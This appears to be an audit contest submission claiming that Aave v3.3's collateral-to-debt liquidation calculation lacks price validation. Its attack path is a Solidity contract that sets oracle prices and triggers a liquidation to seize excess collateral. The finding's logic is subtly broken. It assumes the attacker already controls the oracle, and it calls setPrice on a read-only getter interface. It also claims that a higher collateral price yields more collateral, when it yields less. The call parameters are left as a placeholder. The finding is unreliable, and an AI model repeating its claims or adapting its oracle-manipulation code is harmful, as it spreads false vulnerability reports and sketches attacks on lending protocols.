# Incorrect Collateral to Debt Conversion

### Summary

The _calculateAvailableCollateralToLiquidate function uses calculations based on collateral and debt prices but lacks sufficient validation, leading to potential inaccuracies in liquidation amounts.

### Root Cause

In https://github.com/sherlock-audit/2025-01-aave-v3-3/blob/main/aave-v3-origin/src/contracts/protocol/libraries/logic/LiquidationLogic.sol#L644  the _calculateAvailableCollateralToLiquidate function uses calculations based on collateral and debt prices but lacks sufficient validation, leading to potential inaccuracies in liquidation amounts.

### Attack Path


Exploit Feasibility: If an attacker can manipulate the price oracle to artificially inflate the collateral price, they can liquidate more collateral than the debt they are repaying as shown below.

contract CollateralToDebtExploit {
    IPriceOracleGetter public priceOracle;
    LiquidationLogic public liquidationLogic;

    constructor(address _priceOracle, address _liquidationLogic) {
        priceOracle = IPriceOracleGetter(_priceOracle);
        liquidationLogic = LiquidationLogic(_liquidationLogic);
    }

    function exploitManipulatedPrices(
        address collateralAsset,
        address debtAsset,
        address user,
        uint256 debtToCover
    ) external {
        // Step 1: Manipulate the price oracle (requires attacker control over oracle)
        priceOracle.setPrice(collateralAsset, 100 ether); // Inflate collateral price
        priceOracle.setPrice(debtAsset, 1 ether);        // Deflate debt price

        // Step 2: Perform a liquidation call with manipulated prices
        LiquidationLogic.ExecuteLiquidationCallParams memory params = LiquidationLogic
            .ExecuteLiquidationCallParams({
                collateralAsset: collateralAsset,
                debtAsset: debtAsset,
                user: user,
                debtToCover: debtToCover,
                reservesCount: 2,
                priceOracle: address(priceOracle),
                userEModeCategory: 0,
                priceOracleSentinel: address(0),
                receiveAToken: false
            });

        liquidationLogic.executeLiquidationCall(
            /* pass required reserves data, users config, and other parameters */
            params
        );

        // Step 3: Attacker receives more collateral than intended.
    }
}


### Impact

If the price oracle provides outdated or manipulated data, the calculated collateral amount could be incorrect, leading to over-collateralization or protocol losses.
The protocol could lose funds or incorrectly liquidate user positions.

### Mitigation

Add slippage tolerance and price deviation checks for oracle values.
Use time-weighted average price (TWAP) oracles to reduce manipulation risks.
